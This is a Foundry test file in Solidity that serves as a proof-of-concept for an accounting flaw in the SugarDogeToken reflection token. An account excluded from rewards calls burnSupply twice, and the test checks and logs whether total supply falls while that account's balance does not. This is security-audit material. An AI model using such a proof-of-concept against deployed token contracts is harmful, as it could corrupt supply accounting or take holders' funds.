// SPDX-License-Identifier: MIT
pragma solidity 0.6.8;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/SugarDogeToken.sol";

contract MockRouter {
    function factory() external pure returns (address) {
        return address(0x1234567890123456789012345678901234567890);
    }
    
    function WETH() external pure returns (address) {
        return address(0x5678901234567890123456789012345678901234);
    }
}

contract MockFactory {
    function createPair(address, address) external returns (address) {
        return address(0x1111111111111111111111111111111111111111);
    }
}

contract SugarDogeTokenTest is Test {
    SugarDogeToken token;
    address owner;
    address excludedUser;
    MockRouter mockRouter;
    MockFactory mockFactory;
    
    // Helper to get contract bytecode via assembly (for Solidity <0.8.0)
    function getCode(address _addr) public view returns (bytes memory o_code) {
        assembly {
            let size := extcodesize(_addr)
            o_code := mload(0x40)
            mstore(0x40, add(o_code, and(add(add(size, 0x20), 0x1f), not(0x1f))))
            mstore(o_code, size)
            extcodecopy(_addr, add(o_code, 0x20), 0, size)
        }
    }

    function setUp() public {
        // Create mock dependencies
        mockRouter = new MockRouter();
        mockFactory = new MockFactory();
        
        // Get bytecode via assembly helper
        bytes memory routerCode = getCode(address(mockRouter));
        bytes memory factoryCode = getCode(address(mockFactory));
        
        // Set code for router and factory at expected addresses
        address routerAddr = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        vm.etch(routerAddr, routerCode);
        
        address factoryAddr = 0x1234567890123456789012345678901234567890;
        vm.etch(factoryAddr, factoryCode);
        
        // Deploy token contract
        token = new SugarDogeToken();
        
        // Setup test accounts
        owner = address(this);
        excludedUser = address(0x1);
        
        // Exclude user from rewards and transfer tokens
        token.excludeFromReward(excludedUser);
        uint256 transferAmount = 1000 ether;
        token.transfer(excludedUser, transferAmount);
    }

    function testBurnSupplyWithoutUpdatingExcludedBalance() public {
        uint256 burnAmount = 100 ether;
        
        // Query initial state (BEFORE)
        console.log("--- BEFORE-Trigger ---");
        uint256 initialExcludedBalance = token.balanceOf(excludedUser);
        uint256 initialTotalSupply = token.totalSupply();
        console.log("Excluded user initial balance: %s", initialExcludedBalance);
        console.log("Initial total supply: %s", initialTotalSupply);

        // Trigger: perform two burns from excluded account
        console.log("--- Trigger: burnSupply called twice ---");
        vm.startPrank(excludedUser);
        token.burnSupply(burnAmount);
        token.burnSupply(burnAmount);
        vm.stopPrank();

        // Query final state (AFTER)
        console.log("--- AFTER-Trigger ---");
        uint256 finalExcludedBalance = token.balanceOf(excludedUser);
        uint256 finalTotalSupply = token.totalSupply();
        console.log("Excluded user final balance: %s", finalExcludedBalance);
        console.log("Final total supply: %s", finalTotalSupply);
        
        // Differential validation
        bool excludedBalanceUnchanged = (finalExcludedBalance == initialExcludedBalance);
        bool totalSupplyDecreasedCorrectly = (finalTotalSupply == initialTotalSupply - 2 * burnAmount);
        
        // Final vulnerability verdict
        if (excludedBalanceUnchanged && totalSupplyDecreasedCorrectly) {
            console.log("Vulnerability Exists: Excluded balance remained unchanged while total supply decreased");
        } else if (!excludedBalanceUnchanged) {
            console.log("Vulnerability not Exist: Excluded user balance changed during burn");
        } else if (!totalSupplyDecreasedCorrectly) {
            console.log("Vulnerability not Exist: Total supply did not decrease as expected");
        }
    }
}